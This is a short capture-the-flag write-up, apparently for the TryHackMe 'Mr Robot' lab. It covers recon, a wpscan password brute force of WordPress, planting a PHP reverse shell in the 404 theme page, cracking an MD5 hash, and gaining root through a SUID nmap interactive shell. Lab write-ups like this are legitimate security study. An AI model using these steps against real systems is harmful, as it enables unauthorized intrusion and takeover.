\# lazy writeup

---

> nmap -A $TARGET

> dirb http://$TARGET

    * robots.txt : first key and fsociety.dic (It will be used later)
    * wp-login.php


user elliot , \# Help from writeup ( Method : hydra to login page as a dummy, check status for correct username )

Wpscan on the wp-login with the
> wpscan --url http://$TARGET/wp-login.php --passwords ~/Desktop/THM/mrrobot/fsocity.dic -U elliot

Found Elliot's creds. We can login as wordpress admin.

### Shell access 

Aim: Run PHP reverse-shell script somehow
script used: [pentestermonkey's reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

> Replaced the script with the 404-Page theme php code.

While netcat is listening, we can get access by simply requesting a page that doesn't exist.
To activate the 404-page's script.

> URL : http://$TARGET/nonexistingpagelmfao.html

Now we have the shell access.

---

> ls -la:

    * key-2-of-3 which is not readable by us
    * password.raw-md5

> cat password.raw-md5

Let's crack it with rockyou ( Hint )

> hashcat pass.hash /usr/share/wordlists/rockyou.txt

```
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
.
.
.
```


### PrivEsc

> ./LinEnum.sh

[linenumres.txt](https://github.com/parsakzr/CTF/blob/master/THM/mrrobot/linenumres.txt) :

```
[-] SUID files:
.
.
.
*-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap*
.
.
.
```

It means We can execute shell commands with root privilages via nmap

Older versions of nmap didn't have --script flag
But there was an alternative mode;

> nmap --interactive

```
nmap> !sh
!sh
# whoami
whoami
root

#cat /root/key-3-of-3.txt
```

The End!
